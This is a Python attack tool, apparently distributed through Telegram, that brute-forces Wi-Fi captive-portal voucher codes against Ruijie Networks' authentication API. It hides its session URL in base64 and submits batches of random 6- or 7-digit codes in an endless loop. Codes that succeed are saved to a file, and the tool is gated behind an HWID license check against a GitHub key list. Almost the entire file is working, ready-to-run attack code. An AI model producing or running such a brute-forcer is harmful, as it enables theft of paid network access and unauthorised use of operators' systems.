import os
import re
import sys
import zlib
import json
import time
import base64
import random
import string
import asyncio
import aiohttp
import hashlib
import urllib
import marshal
import requests
import argparse
import subprocess
from datetime import datetime, date, timedelta
from urllib.parse import quote

# Encryption ပိုင်းအတွက် လိုအပ်လျှင် သုံးရန် (Optional)
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except ImportError:
    pass

# ==========================================
# COLORS & UTILS
# ==========================================
w = "\033[1;00m"; g = "\033[1;32m"; y = "\033[1;33m"; r = "\033[1;31m"; b = "\033[1;34m"; dim = "\033[2m"
SUCCESS_COUNT = 0

def clear(): os.system("clear")
def Line(): print(f"{y}-\033[1;00m" * 55)

def Logo():
    clear()
    logo = f"""{r}  __  __  ____  ______     ____  _ 
 |  \/  |/ __ \|  ____|   |  _ \| |
 | \  / | |  | | |__      | |_) | |
 | |\/| | |  | |  __|     |  _ <| |
 | |  | | |__| | |____    | |_) |_|
 |_|  |_|\____/|______|   |____/(_)
                                   
{g}              Created by MOEYU\033[1;00m"""
    print(logo)
    Line()
    print(f"{w}[#] Developer : Moe Yu")
    print(f"{w}[#] Telegram  : @starlink112")
    print(f"{w}[#] Project   : MOEYU BYPASS PRO v5.2")
    print(f"{w}[#] Status    : HWID + GitHub License Active")
    Line()

# ==========================================
# LICENSE SYSTEM (GITHUB)
# ==========================================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

def get_hwid():
    try:
        # Termux environment hardware ID
        cmd = "settings get secure android_id"
        raw_id = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
    except:
        # PC သို့မဟုတ် အခြား environment အတွက်
        raw_id = str(os.getlogin()) + "MOEYU_DEV_PRO"
    return hashlib.md5(raw_id.encode()).hexdigest()[:16]

def check_license():
    my_hwid = get_hwid()
    print(f"{w}[*] Your HWID: {g}{my_hwid}{w}")
    print(f"{w}[*] Status   : Checking Database...", end="\r")
    try:
        res = requests.get(GITHUB_KEY_URL, timeout=15)
        if res.status_code != 200:
            print(f"{r}[!] GitHub Database Error (404/Timeout).{w}"); return False
        
        # Space များကို ဖယ်ထုတ်ပြီး line တစ်ကြောင်းချင်းစစ်ဆေးခြင်း
        data = res.text.splitlines()
        for line in data:
            if not line.strip(): continue
            parts = [p.strip() for p in line.split(',')]
            if parts[0] == my_hwid:
                exp_date_str = parts[2] if len(parts) > 2 else "2099-01-01"
                exp_date = datetime.strptime(exp_date_str, "%Y-%m-%d").date()
                if date.today() > exp_date:
                    print(f"{r}[!] License Expired on {exp_date_str}.{w}"); return False
                print(f"{g}[✓] Access Granted! Expiry: {exp_date_str}{w}")
                return True
        print(f"{r}[!] HWID Not Registered! Please contact admin.{w}"); return False
    except Exception as e:
        print(f"{r}[!] Connection Error: Could not reach GitHub.{w}"); return False

# ==========================================
# VOUCHER HACK CORE
# ==========================================
async def fetch_sid(session, url):
    try:
        async with session.get(url, timeout=10) as response:
            final_url = str(response.url)
            match = re.search(r"sessionId=([a-zA-Z0-9]+)", final_url)
            return match.group(1) if match else None
    except: return None

async def crack(session, sid, voucher):
    global SUCCESS_COUNT
    url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    payload = {"accessCode": voucher, "sessionId": sid, "apiVersion": 1}
    try:
        async with session.post(url, json=payload, timeout=7) as response:
            res = await response.text()
            if 'logonUrl' in res:
                SUCCESS_COUNT += 1
                print(f"\n{g}[★] HIT SUCCESS! VOUCHER: {voucher}{w}")
                with open("success.txt", "a") as f: f.write(f"{datetime.now()}: {voucher}\n")
                return True
            else:
                # Real-time testing log
                print(f"{w}[{time.strftime('%H:%M:%S')}] {dim}Testing:{w} {y}{voucher}{w} {dim}|{w} {r}Failed{w}", end="\r")
                return False
    except: return False

async def run_engine(length):
    # Ruijie WifiDog Session URL (Base64 Encoded for internal security)
    raw_target = "aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ=="
    url = base64.b64decode(raw_target).decode()

    async with aiohttp.ClientSession() as session:
        print(f"{w}[*] Initializing Bypass Engine...")
        sid = await fetch_sid(session, url)
        
        if not sid:
            print(f"{r}[!] Error: Could not get Session ID. Connect to Wi-Fi first.{w}")
            return

        print(f"{g}[✓] Engine Ready. Session: {sid}{w}")
        print(f"{y}[*] Mode: {length} Digits | Brute-force Active{w}")
        Line()

        while True:
            # Batch tasks (တစ်ခါလွှတ်လျှင် ၄၀ စီ စစ်ဆေးမည်)
            tasks = []
            for _ in range(40):
                code = "".join(random.choices(string.digits, k=length))
                tasks.append(crack(session, sid, code))
            
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.05)

# ==========================================
# MAIN EXECUTION
# ==========================================
def main():
    try:
        Logo()
        if not check_license():
            print(f"{r}\n[!] Access Denied. Exit.{w}")
            sys.exit()
        
        print(f"\n{b}AVAILABLE TOOLS:{w}")
        print(f"{g}[1] Voucher Hack (6-Digits Mode)")
        print(f"{g}[2] Voucher Hack (7-Digits Mode)")
        print(f"{g}[3] Internet Bypass Setup")
        print(f"{r}[0] Exit Tool")
        
        choice = input(f"\n{y}Select an option: {w}")
        
        if choice == "1":
            asyncio.run(run_engine(6))
        elif choice == "2":
            asyncio.run(run_engine(7))
        elif choice == "3":
            print(f"{g}[✓] Setup initiated. Running diagnostics...{w}")
            time.sleep(2)
            print(f"{y}[!] Feature under maintenance.{w}")
        else:
            print(f"{r}Exiting Program...{w}")
            sys.exit()

    except KeyboardInterrupt:
        print(f"\n{r}[!] Process Interrupted by User.{w}")
        sys.exit()
    except Exception as e:
        print(f"\n{r}[!] Fatal Error: {e}{w}")

if __name__ == "__main__":
    main()
